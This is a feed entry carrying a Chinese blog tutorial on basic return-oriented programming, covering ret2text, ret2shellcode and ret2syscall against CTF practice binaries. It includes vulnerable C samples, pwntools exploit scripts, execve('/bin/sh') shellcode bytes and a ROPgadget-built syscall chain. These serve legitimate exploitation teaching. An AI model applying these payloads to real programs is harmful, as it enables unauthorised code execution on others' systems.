    <content type="html"><![CDATA[<h2 id="ROP介绍"><a href="#ROP介绍" class="headerlink" title="ROP介绍"></a>ROP介绍</h2><p>因为各种保护的出现，直接向栈或者堆上直接注入代码的方式难以发挥效果。所以需要相应的方法来绕过保护，而目前主要的是<code>ROP(Return Oriented Programming)</code>，其主要方法是在栈缓冲区溢出的基础上，利用程序中已有的小片段<code>(gadgets)</code>来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓<code>gadgets</code>就是以<code>ret</code>结尾的指令序列，通过这些指令序列，可以修改某些地址的内容，方便控制程序的执行流程。</p><p>之所以称之为<code>ROP</code>，是因为核心在于利用了指令集中的<code>ret</code>指令，改变了指令流的执行顺序。<code>ROP</code>攻击一般得满足如下条件:</p><ul><li><p>程序存在溢出，并且可以控制返回地址。</p></li><li><p>可以找到满足条件的<code>gadgets</code>以及相应<code>gadgets</code>的地址。</p></li></ul><p>如果<code>gadgets</code>每次的地址是不固定的，就需要想办法动态获取对应的地址。</p><p>这里我是看 <strong>ctf-wiki</strong> 进行入门学习的，所以写的内容是根据 <strong>ctf-wiki</strong> 中pwn的文章进行的梳理。<br>推荐直接去：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stack-intro-zh/" target="_blank" rel="noopener">ctf-wiki</a></p><h2 id="basic-ROP"><a href="#basic-ROP" class="headerlink" title="basic ROP"></a>basic ROP</h2><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>最基础的ROP利用。<strong>ret</strong> 即指汇编的<code>ret</code>命令，<strong>text</strong> 指程序的代码段。<br>也就是通过溢出构造ROP链去 <strong>执行程序本身已经存在的代码</strong> 来实现自身想要实现的效果。</p><p>简单写一个入门样例程序，编译时保护全关。代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hacker</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf;</span><br><span class="line">  gets(&amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序下载：<a href="http://xibai.xyz/downloads/ctf-wiki/Linux%20Pwn/Stack%20Overflow/Basic%20ROP/ret2text/ret2text">ret2text</a><br>这个程序使用了gets危险函数，存在溢出点。使用ida查看伪c代码可以直接看到<code>buf</code>到栈底的距离只有 4byte 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  gets(&amp;buf, argv, envp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要输入超过 4byte 的数据就可以覆盖到栈底的值和返回地址，而且这个程序已经预先写好了<code>system(&quot;/bin/sh&quot;)</code>在<code>hacker</code>函数里。<br>只要将返回地址覆盖为<code>hacker</code>的地址执行即可。这里再覆盖数据的时候注意：<strong>32bit和64bit的程序的栈指针宽度不同前者为32位4byte，后者8byte，所以数据覆盖到栈底是要注意</strong>到这个问题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2text'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">4</span>+<span class="number">8</span>)      <span class="comment"># 4 是覆盖 到 栈底需要的长度，8 是 覆盖 栈底 需要的长度，64bit系统栈指针宽为 8 byte ，该程序是64位</span></span><br><span class="line">payload += p64(<span class="number">0x401132</span>) <span class="comment"># pwntools 的 p32/64 前文有写过，处理数据挺方便的</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>一般来说可执行程序执行时都是让<code>cpu</code>直接读取运行<code>机器码</code>的，而机器码说到底不过是一串对<code>cpu</code><strong>具有特殊意义</strong>的二进制数值，而计算机系统内部的所有工作都是基于二进制的，包括我们的输入也是以二进制的形式储存在一个地方。如果一个程序存在溢出，但是它本身没有什么可以让我们直接利用的代码段，这时候我们可以看看有没有机会让<code>cpu</code>去<strong>执行我们所能控制的二进制数值</strong>，也就是将我们的输入作为机器码直接执行。<br>说直白一点就是我们刻意控制我们输入的其实是一串可以实现特殊作用的机器码，然后想办法控制<code>cpu</code>的<code>rip/eip</code>为我们的输入的地址，从而令其执行我们想要执行的命令。这串用以<strong>实现某个目的</strong>的<code>code</code>就是所谓的<code>shellcode</code>。</p><p>下面举个例子，源码如下：（<em>假设我们已经可以控制eip为我们的输入所在地址，直接验证shellcode能否实现我们的目的</em>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[<span class="number">24</span>] = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%24c"</span>,shellcode);</span><br><span class="line">    (<span class="keyword">void</span>)((<span class="keyword">void</span> (*)())shellcode)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序下载：<a href="http://xibai.xyz/downloads/ctf-wiki/Linux%20Pwn/Stack%20Overflow/Basic%20ROP/ret2shellcode/shellcode">shellcode</a><br>程序已经声明了一个字符串变量，然后我们输入的内容会被作为指令执行。这里我们将事先准备的可以呼出终端的<code>shellcode</code>作为输入观察结果，这里依旧通过<code>pwntools</code>来完成。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./shellcode"</span>)</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\xcd\x80'</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>可以看到，我们成功用这个本来什么功能都没有的程序呼出了一个终端。<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20200423183617.png" alt="20200423183617"></p><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p>前面我们知道了可以通过<code>溢出</code>和<code>ret</code>来控制程序的执行内容以及<code>shellcode</code>的大概工作原理。那么当我们不能直接控制程序执行<code>shellcode</code>时，我们可以试着<strong>通过</strong><code>ret</code><strong>程序本身的个别代码段，变相实现</strong><code>shellcode</code>的作用。</p><p>这里主要要说到<strong>两个汇编语句</strong>：32bit程序是<code>int 80h</code> 、64bit程序是<code>syscall</code>。这两个语句分别是<code>32bit</code>和<code>64bit</code>实现系统调用的关键语句。<br>不了解系统调用的先来简单了解一下：</p><ul><li><a href="https://blog.csdn.net/u011308691/article/details/16119207?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2&utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2" target="_blank" rel="noopener">csdn-简单了解系统调用</a></li><li><a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8" target="_blank" rel="noopener">维基百科的详细介绍</a></li></ul><p>利用<code>ret2text</code>来调用程序本身的汇编语句实现<code>shellcode</code>。这个就是<code>ret2syscall</code>。<br>在做ctf时一般是通过<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code>来呼出终端实现目的。</p><p>这里因为直接编译c程序不好控制它的汇编代码所以直接用ctf-wiki里给的程序了，偷个懒233<br> <strong>bamboofox</strong> 中的 <strong>ret2syscall</strong> ：<a href="http://xibai.xyz/downloads/ctf-wiki/Linux%20Pwn/Stack%20Overflow/Basic%20ROP/ret2syscall/rop">ret2syscall</a></p><p>用<code>pwntools</code>自带的<code>checksec</code>命令可以看到我们关注的信息：</p><blockquote><p>Arch:     i386-32-little<br>  RELRO:    Partial RELRO<br>  Stack:    No canary found<br>  NX:       NX enabled<br>  PIE:      No PIE (0x8048000)</p></blockquote><p>ida查看main函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"This time, no system() and NO SHELLCODE!!!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What do you plan to do?"</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依旧是一个简单的栈溢出，没有预留什么功能函数。需要<code>ret2syscall</code>的方法来<code>getshell</code>。这里32bit系统的<code>execve()</code>函数的调用号一般都是 <strong>11</strong> 也就是 <strong>0xb</strong> 。<br>所以我们要构造一串命令，将 <strong>eax赋值为0xb，清零ecx，edx，将“/bin/sh”的地址放入ebx，最后执行int 80h</strong>。<br>这里我一般是用<code>ROPgadget</code>来寻找程序里可以实现相关目的的代码段。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure><p>程序里可以用的代码片段不止一个是一般选最方便的，这里选第二个。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only 'pop|ret' | grep 'ebx'</span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p>这里选<code>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</code></p><p>顺便看看程序里有没有能用的<code>/bin/sh</code>字符串。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --string '/bin/sh'</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure><p>最后找一个<code>int 80h</code>就可以了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only 'int'</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line">0x080938fe : int 0xbb</span><br><span class="line">0x080869b5 : int 0xf6</span><br><span class="line">0x0807b4d4 : int 0xfc</span><br></pre></td></tr></table></figure><p>至此，相关片段都已经找好了，我们只需要构造一下payload，是其能完美调用这些片段并实现我们的目的就好。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'./rop'</span>)</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'i386'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">eax_addr = p32(<span class="number">0x80bb196</span>)</span><br><span class="line">binsh_addr = p32(<span class="number">0x80be408</span>)</span><br><span class="line">edx_ecx_ebx_addr = p32(<span class="number">0x806eb90</span>)</span><br><span class="line">int_addr = p32(<span class="number">0x8049421</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x70</span></span><br><span class="line">payload += eax_addr</span><br><span class="line">payload += p32(<span class="number">0xb</span>)</span><br><span class="line">payload += edx_ecx_ebx_addr</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += binsh_addr</span><br><span class="line">payload += int_addr</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="上篇-汐白学Pwn-2-SomeBasic"><a href="#上篇-汐白学Pwn-2-SomeBasic" class="headerlink" title="上篇-汐白学Pwn-2(SomeBasic)"></a><a href="http://xibai.xyz/2020/03/24/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-2(SomeBasic)/">上篇-汐白学Pwn-2(SomeBasic)</a></h2><h2 id="下篇-汐白学Pwn-3-2-ROP-Intermediate"><a href="#下篇-汐白学Pwn-3-2-ROP-Intermediate" class="headerlink" title="下篇-汐白学Pwn-3.2(ROP-Intermediate)"></a><a href="http://xibai.xyz/2020/04/24/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-3.2(ROP)/">下篇-汐白学Pwn-3.2(ROP-Intermediate)</a></h2>]]></content>
    
    <summary type="html">
    
      
      
        
        
          
        
      
    
    </summary>
    
    
      <category term="Pwn" scheme="http://xibai.xyz/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="http://xibai.xyz/tags/Pwn/"/>
    
  </entry>
  
</feed>
